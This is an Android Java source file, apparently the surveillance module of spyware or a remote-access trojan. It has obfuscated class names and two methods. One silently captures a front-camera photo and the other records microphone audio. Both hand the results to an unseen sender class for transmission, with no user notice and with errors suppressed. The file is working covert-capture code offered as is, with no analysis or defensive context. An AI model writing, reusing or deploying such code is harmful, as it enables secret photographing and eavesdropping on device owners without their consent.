package com.v2ram;

import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.*;
import android.util.Base64;
import android.view.Surface;
import java.util.Arrays;

public class j {
    public static void cam(Context c) {
        try {
            CameraManager cm = (CameraManager) c.getSystemService(Context.CAMERA_SERVICE);
            String front = null;
            for (String id : cm.getCameraIdList()) {
                CameraCharacteristics ch = cm.getCameraCharacteristics(id);
                Integer facing = ch.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    front = id; break;
                }
            }
            if (front == null) { k.send("no front cam"); return; }

            final ImageReader r = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
            final String id = front;
            r.setOnImageAvailableListener(reader -> {
                try {
                    android.media.Image img = reader.acquireLatestImage();
                    if (img == null) return;
                    java.nio.ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] d = new byte[buf.remaining()];
                    buf.get(d);
                    img.close();
                    java.io.File f = new java.io.File(c.getCacheDir(), "cam.jpg");
                    java.io.FileOutputStream fo = new java.io.FileOutputStream(f);
                    fo.write(d); fo.close();
                    k.sendFile(f, "front.jpg");
                    reader.close();
                } catch (Throwable ignored) {}
            }, null);

            cm.openCamera(id, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice dev) {
                    try {
                        dev.createCaptureSession(Arrays.asList(r.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override public void onConfigured(CameraCaptureSession s) {
                                    try {
                                        CaptureRequest.Builder b = dev.createCaptureRequest(
                                            CameraDevice.TEMPLATE_STILL_CAPTURE);
                                        b.addTarget(r.getSurface());
                                        s.capture(b.build(), null, null);
                                    } catch (Throwable e) { k.send("cap err: " + e.getMessage()); }
                                }
                                @Override public void onConfigureFailed(CameraCaptureSession s) {
                                    k.send("cfg fail");
                                }
                            }, null);
                    } catch (Throwable e) { k.send("cam err: " + e.getMessage()); }
                }
                @Override public void onDisconnected(CameraDevice dev) { dev.close(); }
                @Override public void onError(CameraDevice dev, int e) { dev.close(); }
            }, null);
        } catch (Throwable t) { k.send("cam: " + t.getMessage()); }
    }

    public static void mic(Context c, int seconds) {
        try {
            int sr = 16000;
            AudioRecord ar = new AudioRecord(MediaRecorder.AudioSource.MIC, sr,
                AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, sr * 2);
            ar.startRecording();
            byte[] buf = new byte[sr * 2 * seconds];
            int off = 0;
            long end = System.currentTimeMillis() + seconds * 1000L;
            while (System.currentTimeMillis() < end && off < buf.length) {
                int n = ar.read(buf, off, Math.min(8192, buf.length - off));
                if (n > 0) off += n;
            }
            ar.stop(); ar.release();
            java.io.File f = new java.io.File(c.getCacheDir(), "mic.raw");
            java.io.FileOutputStream fo = new java.io.FileOutputStream(f);
            fo.write(buf, 0, off); fo.close();
            k.sendFile(f, "mic_" + seconds + "s.raw");
        } catch (Throwable t) { k.send("mic: " + t.getMessage()); }
    }
}